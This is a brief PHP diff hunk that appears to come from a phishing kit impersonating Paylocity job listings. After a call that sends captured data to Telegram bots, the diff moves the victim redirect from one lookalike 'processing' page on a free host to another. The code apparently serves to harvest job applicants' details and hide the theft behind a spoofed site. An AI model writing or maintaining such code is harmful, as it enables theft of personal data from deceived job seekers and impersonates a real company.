@@ -65,7 +65,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://paylocity.koyeb.app/www.paylocity.com/careers/all-listings.job.34092/processing.html");
+header("Location:https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/processing.html");
 
 exit; 
 }
